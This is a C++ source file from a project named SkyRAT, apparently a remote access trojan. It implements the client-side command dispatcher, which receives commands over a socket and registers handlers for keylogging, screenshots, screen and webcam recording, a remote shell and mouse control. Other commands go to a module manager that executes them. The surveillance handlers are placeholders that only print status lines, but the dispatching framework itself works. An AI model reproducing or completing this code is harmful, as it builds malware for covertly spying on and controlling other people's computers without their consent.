#include "CommandDispatcher.h"
#include "ConnectionManager.h"
#include "../Modules/ModuleManager.h"
#include "../Network/MessageProtocol.h"
#include <iostream>
#include <algorithm>
#include <sstream>

namespace SkyRAT {
namespace Core {

CommandDispatcher::CommandDispatcher(SkyRAT::Modules::ModuleManager& moduleManager, ConnectionManager& connectionManager)
    : m_moduleManager(moduleManager), m_connectionManager(connectionManager) {
    
    // Register all built-in commands
    registerBuiltinCommands();
    
    std::cout << "[CommandDispatcher] Initialized with " << m_commandHandlers.size() << " built-in commands" << std::endl;
}

CommandDispatcher::~CommandDispatcher() = default;

// === Core Command Processing ===

CommandDispatcher::CommandResult CommandDispatcher::processCommand(const std::string& rawCommand, SOCKET socket) {
    try {
        // Parse the command
        CommandContext context = parseCommand(rawCommand, socket);
        
        std::cout << "[CommandDispatcher] Processing command: " << context.command << std::endl;
        
        // Update statistics
        m_commandStats[context.command]++;
        
        // Handle special mouse move commands first (they have colons)
        if (context.command.rfind("move:", 0) == 0) {
            CommandResult result = handleMouseCommand(context);
            logCommand(context.command, result);
            sendCommandResult(socket, result);
            return result;
        }
        
        // Find and execute handler
        auto it = m_commandHandlers.find(context.command);
        if (it != m_commandHandlers.end()) {
            CommandResult result = it->second(context);
            logCommand(context.command, result);
            sendCommandResult(socket, result);
            return result;
        }
        
        // Check if it's a module command
        if (m_moduleManager.canHandleCommand(context.command)) {
            bool success = m_moduleManager.executeCommand(context.command, context.arguments, socket);
            CommandResult result = success ? CommandResult::SUCCESS : CommandResult::MODULE_ERROR;
            logCommand(context.command, result);
            sendCommandResult(socket, result);
            return result;
        }
        
        // Unknown command - handle as echo
        CommandResult result = handleUnknownCommand(context);
        logCommand(context.command, result);
        sendCommandResult(socket, result);
        return result;
        
    } catch (const std::exception& e) {
        std::cerr << "[CommandDispatcher] Exception processing command '" << rawCommand 
                  << "': " << e.what() << std::endl;
        sendErrorResponse(socket, "Internal error processing command");
        return CommandResult::FAILURE;
    }
}

bool CommandDispatcher::registerCommand(const std::string& command, CommandHandler handler) {
    if (m_commandHandlers.find(command) != m_commandHandlers.end()) {
        std::cerr << "[CommandDispatcher] Command '" << command << "' already registered" << std::endl;
        return false;
    }
    
    m_commandHandlers[command] = handler;
    std::cout << "[CommandDispatcher] Registered handler for command: " << command << std::endl;
    return true;
}

bool CommandDispatcher::unregisterCommand(const std::string& command) {
    auto it = m_commandHandlers.find(command);
    if (it == m_commandHandlers.end()) {
        return false;
    }
    
    m_commandHandlers.erase(it);
    std::cout << "[CommandDispatcher] Unregistered command: " << command << std::endl;
    return true;
}

bool CommandDispatcher::isCommandRegistered(const std::string& command) const {
    return m_commandHandlers.find(command) != m_commandHandlers.end();
}

std::vector<std::string> CommandDispatcher::getRegisteredCommands() const {
    std::vector<std::string> commands;
    for (const auto& pair : m_commandHandlers) {
        commands.push_back(pair.first);
    }
    return commands;
}

// === Command Parsing ===

CommandDispatcher::CommandContext CommandDispatcher::parseCommand(const std::string& rawCommand, SOCKET socket) const {
    CommandContext context(rawCommand, socket, &m_connectionManager);
    
    // Trim and clean the command
    std::string cleaned = trimCommand(rawCommand);
    
    // Handle special case for MOUSE prefix
    if (cleaned.rfind("MOUSE ", 0) == 0) {
        std::string sub = cleaned.substr(6); // after "MOUSE "
        context.command = "MOUSE";
        if (!sub.empty()) {
            context.arguments.push_back(sub);
        }
        return context;
    }
    
    // Split into command and arguments
    std::vector<std::string> parts = splitArguments(cleaned);
    
    if (!parts.empty()) {
        context.command = parts[0];
        if (parts.size() > 1) {
            context.arguments.assign(parts.begin() + 1, parts.end());
        }
    }
    
    return context;
}

std::vector<std::string> CommandDispatcher::splitArguments(const std::string& commandLine) const {
    std::vector<std::string> arguments;
    std::istringstream iss(commandLine);
    std::string arg;
    
    while (iss >> arg) {
        arguments.push_back(arg);
    }
    
    return arguments;
}

// === Response Handling ===

void CommandDispatcher::sendSuccessResponse(SOCKET socket, const std::string& message) const {
    (void)socket; // Suppress unused parameter warning - client-side doesn't use individual sockets
    std::string response = message.empty() ? "Command executed successfully" : message;
    m_connectionManager.sendResponse(response, true);
}

void CommandDispatcher::sendErrorResponse(SOCKET socket, const std::string& error, int errorCode) const {
    (void)socket; // Suppress unused parameter warning - client-side doesn't use individual sockets
    m_connectionManager.sendError(error, errorCode);
}

void CommandDispatcher::sendCommandResult(SOCKET socket, CommandResult result, const std::string& message) const {
    switch (result) {
        case CommandResult::SUCCESS:
            sendSuccessResponse(socket, message);
            break;
        case CommandResult::FAILURE:
            sendErrorResponse(socket, message.empty() ? "Command failed" : message);
            break;
        case CommandResult::UNKNOWN_COMMAND:
            sendErrorResponse(socket, message.empty() ? "Unknown command" : message, 404);
            break;
        case CommandResult::INVALID_PARAMETERS:
            sendErrorResponse(socket, message.empty() ? "Invalid parameters" : message, 400);
            break;
        case CommandResult::MODULE_ERROR:
            sendErrorResponse(socket, message.empty() ? "Module execution error" : message, 500);
            break;
        case CommandResult::CONNECTION_ERROR:
            sendErrorResponse(socket, message.empty() ? "Connection error" : message, 503);
            break;
    }
}

// === Built-in Command Handlers ===

CommandDispatcher::CommandResult CommandDispatcher::handleScreenshot(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Taking screenshot..." << std::endl;
    
    try {
        // For now, we'll use a placeholder implementation
        // TODO: Integrate with actual screenshot module when migrated
        std::cout << "[CommandDispatcher] Screenshot command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStartKeylogger(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Starting keylogger module..." << std::endl;
    
    try {
        // TODO: Integrate with keylogger module when migrated
        std::cout << "[CommandDispatcher] Start keylogger command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in keylogger handling: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStopKeylogger(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Stopping keylogger..." << std::endl;
    
    try {
        // TODO: Integrate with keylogger module when migrated
        std::cout << "[CommandDispatcher] Stop keylogger command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in stopping keylogger: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStartScreenRecording(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Starting screen recording..." << std::endl;
    
    try {
        // TODO: Integrate with screen recording module when migrated
        std::cout << "[CommandDispatcher] Start screen recording command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in screen recording: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStopScreenRecording(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Stopping screen recording..." << std::endl;
    
    try {
        // TODO: Integrate with screen recording module when migrated
        std::cout << "[CommandDispatcher] Stop screen recording command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in stopping screen recording: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStartRemoteShell(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Starting remote shell..." << std::endl;
    
    try {
        // TODO: Integrate with remote shell module when migrated
        std::cout << "[CommandDispatcher] Start remote shell command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in remote shell: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStopRemoteShell(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Stopping remote shell..." << std::endl;
    
    try {
        // TODO: Integrate with remote shell module when migrated
        std::cout << "[CommandDispatcher] Stop remote shell command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in stopping remote shell: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStartWebcam(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Starting webcam..." << std::endl;
    
    try {
        // TODO: Integrate with webcam module when migrated
        std::cout << "[CommandDispatcher] Start webcam command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in webcam: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleStopWebcam(const CommandContext& context) {
    (void)context; // Suppress unused parameter warning - placeholder implementation
    std::cout << "[Action] Stopping webcam..." << std::endl;
    
    try {
        // TODO: Integrate with webcam module when migrated
        std::cout << "[CommandDispatcher] Stop webcam command - module integration pending" << std::endl;
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in stopping webcam: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleMouseCommand(const CommandContext& context) {
    std::cout << "[Mouse] Processing mouse command: " << context.rawCommand << std::endl;
    
    try {
        // TODO: Integrate with mouse module when migrated
        std::cout << "[CommandDispatcher] Mouse command - module integration pending" << std::endl;
        
        // For now, just acknowledge the command
        if (context.command == "MOUSE" && !context.arguments.empty()) {
            std::cout << "[Mouse] MOUSE prefix detected, executing: " << context.arguments[0] << std::endl;
        } else if (context.command == "up" || context.command == "down" || 
                   context.command == "left" || context.command == "right") {
            std::cout << "[Mouse] Direct mouse command detected: " << context.command << std::endl;
        } else if (context.command.rfind("move:", 0) == 0) {
            std::cout << "[Mouse] Move command detected: " << context.command << std::endl;
        }
        
        return CommandResult::SUCCESS;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in mouse command: " << e.what() << std::endl;
        return CommandResult::MODULE_ERROR;
    }
}

CommandDispatcher::CommandResult CommandDispatcher::handleUnknownCommand(const CommandContext& context) {
    std::cout << "[Action] Unknown command, echoing back: " << context.command << std::endl;
    
    try {
        // Echo the command back as a response
        m_connectionManager.sendMessage("Unknown command: " + context.command);
        return CommandResult::UNKNOWN_COMMAND;
        
    } catch (const std::exception& e) {
        std::cerr << "[Error] Exception in unknown command handling: " << e.what() << std::endl;
        return CommandResult::FAILURE;
    }
}

// === Helper Functions ===

void CommandDispatcher::registerBuiltinCommands() {
    // Screenshot commands
    registerCommand("TAKE_SCREENSHOT", [this](const CommandContext& ctx) {
        return handleScreenshot(ctx);
    });
    
    // Keylogger commands
    registerCommand("START_KEYLOGGER", [this](const CommandContext& ctx) {
        return handleStartKeylogger(ctx);
    });
    
    registerCommand("STOP_KEYLOGGER", [this](const CommandContext& ctx) {
        return handleStopKeylogger(ctx);
    });
    
    // Screen recording commands
    registerCommand("START_SCREEN_RECORDING", [this](const CommandContext& ctx) {
        return handleStartScreenRecording(ctx);
    });
    
    registerCommand("STOP_SCREEN_RECORDING", [this](const CommandContext& ctx) {
        return handleStopScreenRecording(ctx);
    });
    
    // Remote shell commands
    registerCommand("START_REMOTE_SHELL", [this](const CommandContext& ctx) {
        return handleStartRemoteShell(ctx);
    });
    
    registerCommand("STOP_REMOTE_SHELL", [this](const CommandContext& ctx) {
        return handleStopRemoteShell(ctx);
    });
    
    // Webcam commands
    registerCommand("START_WEBCAM", [this](const CommandContext& ctx) {
        return handleStartWebcam(ctx);
    });
    
    registerCommand("STOP_WEBCAM", [this](const CommandContext& ctx) {
        return handleStopWebcam(ctx);
    });
    
    // Mouse commands (these handle both "MOUSE <cmd>" and direct commands)
    registerCommand("MOUSE", [this](const CommandContext& ctx) {
        return handleMouseCommand(ctx);
    });
    
    // Direct mouse commands
    registerCommand("up", [this](const CommandContext& ctx) {
        return handleMouseCommand(ctx);
    });
    
    registerCommand("down", [this](const CommandContext& ctx) {
        return handleMouseCommand(ctx);
    });
    
    registerCommand("left", [this](const CommandContext& ctx) {
        return handleMouseCommand(ctx);
    });
    
    registerCommand("right", [this](const CommandContext& ctx) {
        return handleMouseCommand(ctx);
    });
    
    // Note: Move commands (move:x:y) are handled specially in processCommand
}

std::string CommandDispatcher::trimCommand(const std::string& command) const {
    std::string result = command;
    
    // Remove trailing newlines and carriage returns
    while (!result.empty() && (result.back() == '\n' || result.back() == '\r')) {
        result.pop_back();
    }
    
    // Remove leading whitespace
    result.erase(result.begin(), std::find_if(result.begin(), result.end(), [](unsigned char ch) {
        return !std::isspace(ch);
    }));
    
    // Remove trailing whitespace
    result.erase(std::find_if(result.rbegin(), result.rend(), [](unsigned char ch) {
        return !std::isspace(ch);
    }).base(), result.end());
    
    return result;
}

void CommandDispatcher::logCommand(const std::string& command, CommandResult result) const {
    const char* resultStr;
    switch (result) {
        case CommandResult::SUCCESS: resultStr = "SUCCESS"; break;
        case CommandResult::FAILURE: resultStr = "FAILURE"; break;
        case CommandResult::UNKNOWN_COMMAND: resultStr = "UNKNOWN"; break;
        case CommandResult::INVALID_PARAMETERS: resultStr = "INVALID_PARAMS"; break;
        case CommandResult::MODULE_ERROR: resultStr = "MODULE_ERROR"; break;
        case CommandResult::CONNECTION_ERROR: resultStr = "CONNECTION_ERROR"; break;
        default: resultStr = "UNKNOWN_RESULT"; break;
    }
    
    std::cout << "[CommandDispatcher] Command '" << command << "' result: " << resultStr 
              << " (executed " << m_commandStats[command] << " times)" << std::endl;
}

} // namespace Core
} // namespace SkyRAT